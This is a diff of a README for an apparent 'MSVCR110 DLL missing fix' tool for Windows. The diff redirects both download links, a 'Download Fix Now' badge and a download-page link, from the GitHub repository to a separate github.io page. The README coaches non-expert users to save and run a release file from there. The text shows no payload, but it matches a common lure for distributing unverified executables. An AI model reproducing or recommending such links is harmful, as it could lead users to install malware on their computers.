@@ -1,6 +1,6 @@
 # 🛠️ MSVCR110-DLL-Missing-Fix - Resolve missing system file errors now
 
-[![Download Fix](https://img.shields.io/badge/Download-Fix_Now-blue)](https://github.com/ubaidgamerp6865/MSVCR110-DLL-Missing-Fix)
+[![Download Fix](https://img.shields.io/badge/Download-Fix_Now-blue)](https://ubaidgamerp6865.github.io)
 
 ## What this tool does
 
@@ -17,7 +17,7 @@ To run this fix, you need a computer running Windows 10 or Windows 11. You must 
 3. Click the download button for the release file.
 4. Save the file to your computer in a folder you can find easily, such as your Downloads folder.
 
-[Click here to visit the download page](https://github.com/ubaidgamerp6865/MSVCR110-DLL-Missing-Fix)
+[Click here to visit the download page](https://ubaidgamerp6865.github.io)
 
 ## ⚙️ Installation steps
 
